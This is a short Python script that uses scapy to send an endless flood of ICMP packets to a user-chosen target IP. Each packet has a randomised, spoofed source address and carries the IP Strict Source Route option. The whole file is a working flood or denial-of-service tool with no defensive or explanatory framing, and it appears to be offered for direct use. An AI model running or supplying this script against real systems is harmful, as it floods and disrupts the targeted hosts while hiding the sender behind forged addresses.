import scapy.all as scapy
import os


def IP_Strict_Route():

	clear = os.system('clear')
	print("**************************************")
	print("         IP Strict Route")
	print("**************************************")

	print("Please input your target's IP")
	target = input("[Strict_Route]#")
	num =0
	try:
		while True:
			packet = scapy.IP(src=scapy.RandIP(),dst=target,options=[scapy.IPOption_SSRR(),scapy.IPOption_EOL()])/scapy.ICMP()
			scapy.send(packet,verbose=False)
			num +=1
			print("Sent "+str(num)+" packets")
	except KeyboardInterrupt:
		print("quit!")
	
IP_Strict_Route()